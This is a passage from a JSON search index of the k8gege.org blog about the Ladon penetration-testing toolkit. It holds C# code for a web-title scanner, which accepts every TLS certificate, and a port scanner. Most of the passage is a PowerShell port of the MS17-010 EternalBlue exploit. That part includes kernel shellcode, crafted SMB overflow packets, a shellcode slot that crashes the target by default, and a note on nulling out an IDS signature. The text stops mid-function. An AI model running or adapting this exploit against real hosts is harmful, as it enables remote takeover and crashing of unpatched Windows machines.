&#x2F;&#x2F;res.Close(); return res.Server; &#125; catch (WebException ex) &#123; return &quot;&quot;; &#125; &#125; private static string GetTitle(string html) &#123; if (html.Contains(&quot;&lt;hTmlKErRor&gt;&quot;)) &#123; &#x2F;&#x2F;return html.Replace(&quot;&lt;hTmlKErRor&gt;&quot;, &quot;&quot;); return &quot;&quot;; &#125; html &#x3D; html.Replace(&quot;&lt;br&gt;&quot;, &quot;&quot;); html &#x3D; html.Replace(&quot;&lt;BR&gt;&quot;, &quot;&quot;); html &#x3D; html.Replace(&quot;\\r\\n&quot;, &quot;&quot;); html &#x3D; html.Replace(&quot;&amp;nbsp;&quot;, &quot; &quot;); html &#x3D; html.Replace(&quot;\\n&quot;, &quot;&quot;).Trim(); String regex &#x3D; @&quot;&lt;title.+&lt;&#x2F;title&gt;&quot;; String title &#x3D; Regex.Match(html, regex).ToString(); title &#x3D; Regex.Replace(title, @&quot;[\\&quot;&quot;]+&quot;, &quot;&quot;); title &#x3D; title.TrimStart(&#39;&lt;&#39;); string regex2 &#x3D; @&quot;&gt;.+&lt;&#x2F;title&gt;&quot;; string title2 &#x3D; Regex.Match(title, regex2).ToString(); title2 &#x3D; title2.TrimStart(&#39;&gt;&#39;).Replace(&quot;&lt;&#x2F;title&gt;&quot;, &quot;&quot;).Trim(); if (title2.Length &gt; 50) return title2.Substring(0, 50); return title2; &#125; private static string getHtml(string url, int codingType) &#123; try &#123; if (!url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;) &amp;&amp; !url.ToLower().Contains(&quot;http:&#x2F;&#x2F;&quot;)) url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url; WebClient myWebClient &#x3D; new WebClient(); if (url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;)) &#123; System.Net.ServicePointManager.ServerCertificateValidationCallback +&#x3D; delegate(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certificate, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors) &#123; return true; &#x2F;&#x2F; **** Always accept &#125;; &#125; byte[] myDataBuffer &#x3D; myWebClient.DownloadData(url); &#x2F;&#x2F;return Encoding.Default.GetString(myDataBuffer); string strWebData &#x3D; System.Text.Encoding.Default.GetString(myDataBuffer); &#x2F;&#x2F;自动识别编码 不一定有&lt;meta 比如 百度开放平台 content&#x3D;&quot;text&#x2F;html; charset&#x3D;gbk&quot;&gt; &#x2F;&#x2F;Match charSetMatch &#x3D; Regex.Match(strWebData, &quot;&lt;meta([^&gt;]*)charset&#x3D;(\\&quot;)?(.*)?\\&quot;&quot;, RegexOptions.IgnoreCase | RegexOptions.Multiline); Match charSetMatch &#x3D; Regex.Match(strWebData, &quot;(.*)charset&#x3D;(\\&quot;)?(.*)?\\&quot;&quot;, RegexOptions.IgnoreCase | RegexOptions.Multiline); string webCharSet &#x3D; charSetMatch.Groups[3].Value.Trim().ToLower(); if (webCharSet !&#x3D; &quot;gb2312&quot; &amp;&amp; webCharSet !&#x3D; &quot;gbk&quot;) &#123; webCharSet &#x3D; &quot;utf-8&quot;; &#125; if (System.Text.Encoding.GetEncoding(webCharSet) !&#x3D; System.Text.Encoding.Default) &#123; strWebData &#x3D; System.Text.Encoding.GetEncoding(webCharSet).GetString(myDataBuffer); &#125; &#x2F;&#x2F;if (codingType &#x3D;&#x3D; 1) &#x2F;&#x2F; return Encoding.Unicode.GetString(myDataBuffer); &#x2F;&#x2F;else if (codingType &#x3D;&#x3D; 2) &#x2F;&#x2F; return Encoding.Default.GetString(myDataBuffer);&#x2F;&#x2F;GBK 936 &#x2F;&#x2F;else if (codingType &#x3D;&#x3D; 3) &#x2F;&#x2F; return Encoding.UTF8.GetString(myDataBuffer);&#x2F;&#x2F;65501 return strWebData; &#125; catch (Exception ex) &#123; &#x2F;&#x2F;Console.WriteLine(url + &quot; &quot; + ex.Message); return &quot;&lt;hTmlKErRor&gt;&quot; + ex.Message; &#125; return &quot;&quot;; &#125; &#125;&#125;","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/categories/Dotnet/"},{"name":"主机发现","slug":"OnlinePC","permalink":"http://k8gege.org/categories/OnlinePC/"},{"name":"信息收集","slug":"Discover","permalink":"http://k8gege.org/categories/Discover/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Code","slug":"Code","permalink":"http://k8gege.org/tags/Code/"},{"name":"Moudle","slug":"Moudle","permalink":"http://k8gege.org/tags/Moudle/"},{"name":"WebScan","slug":"WebScan","permalink":"http://k8gege.org/tags/WebScan/"},{"name":"C#","slug":"C","permalink":"http://k8gege.org/tags/C/"}]},{"title":"Ladon插件实例简单端口扫描C#源码","slug":"Ladon Moudle PortScan Demo","date":"2019-12-08T04:52:24.000Z","updated":"2020-01-18T11:48:48.870Z","comments":true,"path":"p/4a713e0e.html","link":"","permalink":"http://k8gege.org/p/4a713e0e.html","excerpt":"","text":"源码为单纯检测端口是否开放，有需要大家可自行定制功能。当然可以使用PortScan模块扫描开放端口带服务和Web识别。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455using System;using System.Collections.Generic;using System.Text;using System.Net;using System.Text.RegularExpressions;using System.Net.Sockets;&#x2F;&#x2F;Ladon PortScan Moudlenamespace LadonDLL&#123; public class scan &#123; public static string run(string ip) &#123; if (string.IsNullOrEmpty(ip)) return &quot;&quot;; else &#123; if (K8CheckPort(ip, 21)) Console.Write(ip + &quot;\\t21 Open\\r\\n&quot;); if (K8CheckPort(ip, 80)) Console.Write(ip + &quot;\\t80 Open\\r\\n&quot;); if (K8CheckPort(ip, 1433)) Console.Write(ip + &quot;\\t1433 Open\\r\\n&quot;); if (K8CheckPort(ip, 3306)) Console.Write(ip + &quot;\\t3306 Open\\r\\n&quot;); if (K8CheckPort(ip, 1521)) Console.Write(ip + &quot;\\t1521 Open\\r\\n&quot;); if (K8CheckPort(ip, 3389)) Console.Write(ip + &quot;\\t3389 Open\\r\\n&quot;); &#125; return &quot;&quot;; &#125; private static bool K8CheckPort(string ip, int Port) &#123; &#x2F;&#x2F;int Port &#x3D; 21; IPAddress scanip &#x3D; IPAddress.Parse(ip); IPEndPoint point &#x3D; new IPEndPoint(scanip, Port); try &#123; TcpClient tcp &#x3D; new TcpClient(); tcp.Connect(point); &#x2F;&#x2F;Console.WriteLine(scanip + &quot;\\t&quot; + Port + &quot;\\tOpen&quot;); return true; &#125; catch (Exception ex) &#123; &#x2F;&#x2F;Console.WriteLine(scanip + &quot;\\t&quot; + Port + &quot;\\tClose&quot;); return false; &#125; &#125; &#125;&#125;","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/categories/Dotnet/"},{"name":"源码","slug":"Code","permalink":"http://k8gege.org/categories/Code/"},{"name":"编程","slug":"Program","permalink":"http://k8gege.org/categories/Program/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Code","slug":"Code","permalink":"http://k8gege.org/tags/Code/"},{"name":"Moudle","slug":"Moudle","permalink":"http://k8gege.org/tags/Moudle/"},{"name":"PortScan","slug":"PortScan","permalink":"http://k8gege.org/tags/PortScan/"},{"name":"Sharp","slug":"Sharp","permalink":"http://k8gege.org/tags/Sharp/"}]},{"title":"Ladon MS17010 Exploit for PowerShell","slug":"Ladon MS17010 Exploit for PowerShell","date":"2019-12-07T08:00:00.000Z","updated":"2020-06-11T16:22:56.278Z","comments":true,"path":"p/89f3c60.html","link":"","permalink":"http://k8gege.org/p/89f3c60.html","excerpt":"","text":"Win Ladon Kali PowerShell MS17010EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723#Ladon Moudle MS17010 EXPLOIT#Using Invoke-EternalBlue.ps1#Author k8gegefunction Ladon ()&#123;param([string]$ip) #write-output $ip$result=-Join(\"MS17010EXP \",$ip)Invoke-EternalBlue $ip 12 5return $result&#125;#replace your shellcode (default is blue screen)[Byte[]] $Shellcode = @(0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49)function Invoke-EternalBlue($Target, $InitialGrooms, $MaxAttempts)&#123; write-output $Target&lt;# .SYNOPSIS PowerShell port of MS17_010 Metasploit module Based on Eternal Blue metasploit module by Sean Dillon &lt;sean.dillon@risksense.com&gt;', # @zerosum0x0 'Dylan Davis &lt;dylan.davis@risksense.com&gt;', # @jennamagius .PARAMETER Target. Host to exploit .PARAMETER InitialGrooms Initial Grooms. .PARAMETER MaxAttempts number of times to run exploit .PARAMETER ShellCode ShellCode to execute on exploit .EXAMPLE Invoke-EternalBlue -Target 127.0.0.1 -InitialGrooms 12 -MaxAttempts 12 -Shellcode @(0x90,0x90,0xC3)#&gt;$enc = [system.Text.Encoding]::ASCII$GROOM_DELTA = 5function make_kernel_shellcode &#123; [Byte[]] $shellcode =@(0xB9,0x82,0x00,0x00,0xC0,0x0F,0x32,0x48,0xBB,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,0xFF,0x89,0x53,0x04,0x89,0x03,0x48,0x8D,0x05,0x0A,0x00,0x00,0x00,0x48,0x89,0xC2,0x48,0xC1,0xEA,0x20,0x0F,0x30,0xC3,0x0F,0x01,0xF8,0x65,0x48,0x89,0x24,0x25,0x10,0x00,0x00,0x00,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x50,0x53,0x51,0x52,0x56,0x57,0x55,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x6A,0x2B,0x65,0xFF,0x34,0x25,0x10,0x00,0x00,0x00,0x41,0x53,0x6A,0x33,0x51,0x4C,0x89,0xD1,0x48,0x83,0xEC,0x08,0x55,0x48,0x81,0xEC,0x58,0x01,0x00,0x00,0x48,0x8D,0xAC,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x9D,0xC0,0x00,0x00,0x00,0x48,0x89,0xBD,0xC8,0x00,0x00,0x00,0x48,0x89,0xB5,0xD0,0x00,0x00,0x00,0x48,0xA1,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,0xFF,0x48,0x89,0xC2,0x48,0xC1,0xEA,0x20,0x48,0x31,0xDB,0xFF,0xCB,0x48,0x21,0xD8,0xB9,0x82,0x00,0x00,0xC0,0x0F,0x30,0xFB,0xE8,0x38,0x00,0x00,0x00,0xFA,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x48,0x83,0xEC,0x78,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x41,0x5B,0x41,0x5A,0x41,0x59,0x41,0x58,0x5D,0x5F,0x5E,0x5A,0x59,0x5B,0x58,0x65,0x48,0x8B,0x24,0x25,0x10,0x00,0x00,0x00,0x0F,0x01,0xF8,0xFF,0x24,0x25,0xF8,0x0F,0xD0,0xFF,0x56,0x41,0x57,0x41,0x56,0x41,0x55,0x41,0x54,0x53,0x55,0x48,0x89,0xE5,0x66,0x83,0xE4,0xF0,0x48,0x83,0xEC,0x20,0x4C,0x8D,0x35,0xE3,0xFF,0xFF,0xFF,0x65,0x4C,0x8B,0x3C,0x25,0x38,0x00,0x00,0x00,0x4D,0x8B,0x7F,0x04,0x49,0xC1,0xEF,0x0C,0x49,0xC1,0xE7,0x0C,0x49,0x81,0xEF,0x00,0x10,0x00,0x00,0x49,0x8B,0x37,0x66,0x81,0xFE,0x4D,0x5A,0x75,0xEF,0x41,0xBB,0x5C,0x72,0x11,0x62,0xE8,0x18,0x02,0x00,0x00,0x48,0x89,0xC6,0x48,0x81,0xC6,0x08,0x03,0x00,0x00,0x41,0xBB,0x7A,0xBA,0xA3,0x30,0xE8,0x03,0x02,0x00,0x00,0x48,0x89,0xF1,0x48,0x39,0xF0,0x77,0x11,0x48,0x8D,0x90,0x00,0x05,0x00,0x00,0x48,0x39,0xF2,0x72,0x05,0x48,0x29,0xC6,0xEB,0x08,0x48,0x8B,0x36,0x48,0x39,0xCE,0x75,0xE2,0x49,0x89,0xF4,0x31,0xDB,0x89,0xD9,0x83,0xC1,0x04,0x81,0xF9,0x00,0x00,0x01,0x00,0x0F,0x8D,0x66,0x01,0x00,0x00,0x4C,0x89,0xF2,0x89,0xCB,0x41,0xBB,0x66,0x55,0xA2,0x4B,0xE8,0xBC,0x01,0x00,0x00,0x85,0xC0,0x75,0xDB,0x49,0x8B,0x0E,0x41,0xBB,0xA3,0x6F,0x72,0x2D,0xE8,0xAA,0x01,0x00,0x00,0x48,0x89,0xC6,0xE8,0x50,0x01,0x00,0x00,0x41,0x81,0xF9,0xBF,0x77,0x1F,0xDD,0x75,0xBC,0x49,0x8B,0x1E,0x4D,0x8D,0x6E,0x10,0x4C,0x89,0xEA,0x48,0x89,0xD9,0x41,0xBB,0xE5,0x24,0x11,0xDC,0xE8,0x81,0x01,0x00,0x00,0x6A,0x40,0x68,0x00,0x10,0x00,0x00,0x4D,0x8D,0x4E,0x08,0x49,0xC7,0x01,0x00,0x10,0x00,0x00,0x4D,0x31,0xC0,0x4C,0x89,0xF2,0x31,0xC9,0x48,0x89,0x0A,0x48,0xF7,0xD1,0x41,0xBB,0x4B,0xCA,0x0A,0xEE,0x48,0x83,0xEC,0x20,0xE8,0x52,0x01,0x00,0x00,0x85,0xC0,0x0F,0x85,0xC8,0x00,0x00,0x00,0x49,0x8B,0x3E,0x48,0x8D,0x35,0xE9,0x00,0x00,0x00,0x31,0xC9,0x66,0x03,0x0D,0xD7,0x01,0x00,0x00,0x66,0x81,0xC1,0xF9,0x00,0xF3,0xA4,0x48,0x89,0xDE,0x48,0x81,0xC6,0x08,0x03,0x00,0x00,0x48,0x89,0xF1,0x48,0x8B,0x11,0x4C,0x29,0xE2,0x51,0x52,0x48,0x89,0xD1,0x48,0x83,0xEC,0x20,0x41,0xBB,0x26,0x40,0x36,0x9D,0xE8,0x09,0x01,0x00,0x00,0x48,0x83,0xC4,0x20,0x5A,0x59,0x48,0x85,0xC0,0x74,0x18,0x48,0x8B,0x80,0xC8,0x02,0x00,0x00,0x48,0x85,0xC0,0x74,0x0C,0x48,0x83,0xC2,0x4C,0x8B,0x02,0x0F,0xBA,0xE0,0x05,0x72,0x05,0x48,0x8B,0x09,0xEB,0xBE,0x48,0x83,0xEA,0x4C,0x49,0x89,0xD4,0x31,0xD2,0x80,0xC2,0x90,0x31,0xC9,0x41,0xBB,0x26,0xAC,0x50,0x91,0xE8,0xC8,0x00,0x00,0x00,0x48,0x89,0xC1,0x4C,0x8D,0x89,0x80,0x00,0x00,0x00,0x41,0xC6,0x01,0xC3,0x4C,0x89,0xE2,0x49,0x89,0xC4,0x4D,0x31,0xC0,0x41,0x50,0x6A,0x01,0x49,0x8B,0x06,0x50,0x41,0x50,0x48,0x83,0xEC,0x20,0x41,0xBB,0xAC,0xCE,0x55,0x4B,0xE8,0x98,0x00,0x00,0x00,0x31,0xD2,0x52,0x52,0x41,0x58,0x41,0x59,0x4C,0x89,0xE1,0x41,0xBB,0x18,0x38,0x09,0x9E,0xE8,0x82,0x00,0x00,0x00,0x4C,0x89,0xE9,0x41,0xBB,0x22,0xB7,0xB3,0x7D,0xE8,0x74,0x00,0x00,0x00,0x48,0x89,0xD9,0x41,0xBB,0x0D,0xE2,0x4D,0x85,0xE8,0x66,0x00,0x00,0x00,0x48,0x89,0xEC,0x5D,0x5B,0x41,0x5C,0x41,0x5D,0x41,0x5E,0x41,0x5F,0x5E,0xC3,0xE9,0xB5,0x00,0x00,0x00,0x4D,0x31,0xC9,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0x01,0xC1,0x38,0xE0,0x75,0xEC,0xC3,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x12,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x45,0x31,0xC9,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xEE,0x45,0x39,0xD9,0x75,0xDA,0x4C,0x8B,0x7A,0x20,0xC3,0x4C,0x89,0xF8,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x89,0xC2,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0xE8,0x78,0xFF,0xFF,0xFF,0x45,0x39,0xD9,0x75,0xEC,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5B,0x41,0x53,0xFF,0xE0,0x56,0x41,0x57,0x55,0x48,0x89,0xE5,0x48,0x83,0xEC,0x20,0x41,0xBB,0xDA,0x16,0xAF,0x92,0xE8,0x4D,0xFF,0xFF,0xFF,0x31,0xC9,0x51,0x51,0x51,0x51,0x41,0x59,0x4C,0x8D,0x05,0x1A,0x00,0x00,0x00,0x5A,0x48,0x83,0xEC,0x20,0x41,0xBB,0x46,0x45,0x1B,0x22,0xE8,0x68,0xFF,0xFF,0xFF,0x48,0x89,0xEC,0x5D,0x41,0x5F,0x5E,0xC3)return $shellcode&#125;function make_kernel_user_payload($ring3) &#123; $sc = make_kernel_shellcode $sc += [bitconverter]::GetBytes([uint16] ($ring3.length)) $sc += $ring3 return $sc &#125;function make_smb2_payload_headers_packet()&#123; [Byte[]] $pkt = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) + [system.Text.Encoding]::ASCII.GetBytes(\"SMB\") + [Byte[]](0x00)*124 return $pkt&#125;function make_smb2_payload_body_packet($kernel_user_payload) &#123; $pkt_max_len = 4204 $pkt_setup_len = 497 $pkt_max_payload = $pkt_max_len - $pkt_setup_len #padding [Byte[]] $pkt = [Byte[]] (0x00) * 0x8 $pkt += 0x03,0x00,0x00,0x00 $pkt += [Byte[]] (0x00) * 0x1c $pkt += 0x03,0x00,0x00,0x00 $pkt += [Byte[]] (0x00) * 0x74# KI_USER_SHARED_DATA addresses $pkt += [Byte[]] (0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff) * 2 # x64 address $pkt += [Byte[]] (0x00) * 0x10 $pkt += [Byte[]] (0xc0,0xf0,0xdf,0xff) * 2 # x86 address $pkt += [Byte[]] (0x00) * 0xc4 # payload addreses $pkt += 0x90,0xf1,0xdf,0xff $pkt += [Byte[]] (0x00) * 0x4 $pkt += 0xf0,0xf1,0xdf,0xff $pkt += [Byte[]] (0x00) * 0x40 $pkt += 0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff $pkt += [Byte[]] (0x00) * 0x8 $pkt += 0x00,0x02,0xd0,0xff,0xff,0xff,0xff,0xff $pkt += 0x00 $pkt += $kernel_user_payload # fill out the rest, this can be randomly generated $pkt += 0x00 * ($pkt_max_payload - $kernel_user_payload.length) return $pkt&#125;function make_smb1_echo_packet($tree_id, $user_id) &#123; [Byte[]] $pkt = [Byte[]] (0x00) # type $pkt += 0x00,0x00,0x31 # len = 49 $pkt += [Byte[]] (0xff) + $enc.GetBytes(\"SMB\") # SMB1 $pkt += 0x2b # Echo $pkt += 0x00,0x00,0x00,0x00 # Success $pkt += 0x18 # flags $pkt += 0x07,0xc0 # flags2 $pkt += 0x00,0x00 # PID High $pkt += 0x00,0x00,0x00,0x00 # Signature1 $pkt += 0x00,0x00,0x00,0x00 # Signature2 $pkt += 0x00,0x00 # Reserved $pkt += $tree_id # Tree ID $pkt += 0xff,0xfe # PID $pkt += $user_id # UserID $pkt += 0x40,0x00 # MultiplexIDs $pkt += 0x01 # Word count $pkt += 0x01,0x00 # Echo count $pkt += 0x0c,0x00 # Byte count # echo data # this is an existing IDS signature, and can be nulled out #$pkt += 0x4a,0x6c,0x4a,0x6d,0x49,0x68,0x43,0x6c,0x42,0x73,0x72,0x00 $pkt += 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x00 return $pkt&#125;function make_smb1_trans2_exploit_packet($tree_id, $user_id, $type, $timeout) &#123; $timeout = ($timeout * 0x10) + 3 [Byte[]] $pkt = [Byte[]] (0x00) # Session message $pkt += 0x00,0x10,0x35 # length $pkt += 0xff,0x53,0x4D,0x42 # SMB1 $pkt += 0x33 # Trans2 request $pkt += 0x00,0x00,0x00,0x00 # NT SUCCESS $pkt += 0x18 # Flags $pkt += 0x07,0xc0 # Flags2 $pkt += 0x00,0x00 # PID High $pkt += 0x00,0x00,0x00,0x00 # Signature1 $pkt += 0x00,0x00,0x00,0x00 # Signature2 $pkt += 0x00,0x00 # Reserved $pkt += $user_id # TreeID $pkt += 0xff,0xfe # PID $pkt += $user_id # UserID $pkt += 0x40,0x00 # MultiplexIDs $pkt += 0x09 # Word Count $pkt += 0x00,0x00 # Total Param Count $pkt += 0x00,0x10 # Total Data Count $pkt += 0x00,0x00 # Max Param Count $pkt += 0x00,0x00 # Max Data Count $pkt += 0x00 # Max Setup Count $pkt += 0x00 # Reserved $pkt += 0x00,0x10 # Flags $pkt += 0x35,0x00,0xd0 # Timeouts $pkt += [bitconverter]::GetBytes($timeout)[0] #timeout is a single int $pkt += 0x00,0x00 # Reserved $pkt += 0x00,0x10 # Parameter Count #$pkt += 0x74,0x70 # Parameter Offset #$pkt += 0x47,0x46 # Data Count #$pkt += 0x45,0x6f # Data Offset #$pkt += 0x4c # Setup Count #$pkt += 0x4f # Reserved if ($type -eq \"eb_trans2_exploit\") &#123; $pkt += [Byte[]] (0x41) * 2957 $pkt += 0x80,0x00,0xa8,0x00 # overflow $pkt += [Byte[]] (0x00) * 0x10 $pkt += 0xff,0xff $pkt += [Byte[]] (0x00) * 0x6 $pkt += 0xff,0xff $pkt += [Byte[]] (0x00) * 0x16 $pkt += 0x00,0xf1,0xdf,0xff # x86 addresses $pkt += [Byte[]] (0x00) * 0x8 $pkt += 0x20,0xf0,0xdf,0xff $pkt += 0x00,0xf1,0xdf,0xff,0xff,0xff,0xff,0xff # x64 $pkt += 0x60,0x00,0x04,0x10 $pkt += [Byte[]] (0x00) * 4 $pkt += 0x80,0xef,0xdf,0xff $pkt += [Byte[]] (0x00) * 4 $pkt += 0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff $pkt += 0x18,0x01,0xd0,0xff,0xff,0xff,0xff,0xff $pkt += [Byte[]] (0x00) * 0x10 $pkt += 0x60,0x00,0x04,0x10 $pkt += [Byte[]] (0x00) * 0xc $pkt += 0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff $pkt += [Byte[]] (0x00) * 0x8 $pkt += 0x80,0x10 $pkt += [Byte[]] (0x00) * 0xe $pkt += 0x39 $pkt += 0xbb $pkt += [Byte[]] (0x41) * 965 return $pkt &#125; if($type -eq \"eb_trans2_zero\") &#123; $pkt += [Byte[]] (0x00) * 2055 $pkt += 0x83,0xf3 $pkt += [Byte[]] (0x41) * 2039 #$pkt += 0x00 * 4096 &#125; else &#123; $pkt += [Byte[]] (0x41) * 4096 &#125; return $pkt &#125;function negotiate_proto_request()&#123; [Byte[]] $pkt = [Byte[]] (0x00) # Message_Type $pkt += 0x00,0x00,0x54 # Length $pkt += 0xFF,0x53,0x4D,0x42 # server_component: .SMB $pkt += 0x72 # smb_command: Negotiate Protocol $pkt += 0x00,0x00,0x00,0x00 # nt_status $pkt += 0x18 # flags $pkt += 0x01,0x28 # flags2 $pkt += 0x00,0x00 # process_id_high $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 # signature $pkt += 0x00,0x00 # reserved $pkt += 0x00,0x00 # tree_id $pkt += 0x2F,0x4B # process_id $pkt += 0x00,0x00 # user_id $pkt += 0xC5,0x5E # multiplex_id $pkt += 0x00 # word_count $pkt += 0x31,0x00 # byte_count # Requested Dialects $pkt += 0x02 # dialet_buffer_format $pkt += 0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x31,0x2E,0x30,0x00 # dialet_name: LANMAN1.0 $pkt += 0x02 # dialet_buffer_format $pkt += 0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,0x00 # dialet_name: LM1.2X002 $pkt += 0x02 # dialet_buffer_format $pkt += 0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,0x30,0x00 # dialet_name3: NT LANMAN 1.0 $pkt += 0x02 # dialet_buffer_format $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00 # dialet_name4: NT LM 0.12 return $pkt&#125;function make_smb1_nt_trans_packet($tree_id, $user_id) &#123; [Byte[]] $pkt = [Byte[]] (0x00) # Session message $pkt += 0x00,0x04,0x38 # length $pkt += 0xff,0x53,0x4D,0x42 # SMB1 $pkt += 0xa0 # NT Trans $pkt += 0x00,0x00,0x00,0x00 # NT SUCCESS $pkt += 0x18 # Flags $pkt += 0x07,0xc0 # Flags2 $pkt += 0x00,0x00 # PID High $pkt += 0x00,0x00,0x00,0x00 # Signature1 $pkt += 0x00,0x00,0x00,0x00 # Signature2 $pkt += 0x00,0x00 # Reserved $pkt += $tree_id # TreeID $pkt += 0xff,0xfe # PID $pkt += $user_id # UserID $pkt += 0x40,0x00 # MultiplexID $pkt += 0x14 # Word Count $pkt += 0x01 # Max Setup Count $pkt += 0x00,0x00 # Reserved $pkt += 0x1e,0x00,0x00,0x00 # Total Param Count $pkt += 0xd0,0x03,0x01,0x00 # Total Data Count $pkt += 0x1e,0x00,0x00,0x00 # Max Param Count $pkt += 0x00,0x00,0x00,0x00 # Max Data Count $pkt += 0x1e,0x00,0x00,0x00 # Param Count $pkt += 0x4b,0x00,0x00,0x00 # Param Offset $pkt += 0xd0,0x03,0x00,0x00 # Data Count $pkt += 0x68,0x00,0x00,0x00 # Data Offset $pkt += 0x01 # Setup Count $pkt += 0x00,0x00 # Function &lt;unknown&gt; $pkt += 0x00,0x00 # Unknown NT transaction (0) setup $pkt += 0xec,0x03 # Byte Count $pkt += [Byte[]] (0x00) * 0x1f # NT Parameters # undocumented $pkt += 0x01 $pkt += [Byte[]](0x00) * 0x3cd return $pkt &#125; function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) &#123; [Byte[]] $pkt = 0x00 # Session message $pkt += 0x00,0x00,0x51 # length $pkt += 0xff,0x53,0x4D,0x42 # SMB1 $pkt += 0x73 # Session Setup AndX $pkt += 0x00,0x00,0x00,0x00 # NT SUCCESS $pkt += 0x18 # Flags $pkt += $flags2 # Flags2 $pkt += 0x00,0x00 # PID High $pkt += 0x00,0x00,0x00,0x00 # Signature1 $pkt += 0x00,0x00,0x00,0x00 # Signature2 $pkt += 0x00,0x00 # Reserved $pkt += 0x00,0x00 # TreeID $pkt += 0xff,0xfe # PID $pkt += 0x00,0x00 # UserID $pkt += 0x40,0x00 # MultiplexID #$pkt += 0x00,0x00 # Reserved $pkt += 0x0c # Word Count $pkt += 0xff # No further commands $pkt += 0x00 # Reserved $pkt += 0x00,0x00 # AndXOffset $pkt += 0x04,0x11 # Max Buffer $pkt += 0x0a,0x00 # Max Mpx Count $pkt += $vcnum # VC Number $pkt += 0x00,0x00,0x00,0x00 # Session key $pkt += 0x00,0x00 # Security blob length $pkt += 0x00,0x00,0x00,0x00 # Reserved $pkt += 0x00,0x00,0x00,0x80 # Capabilities $pkt += 0x16,0x00 # Byte count 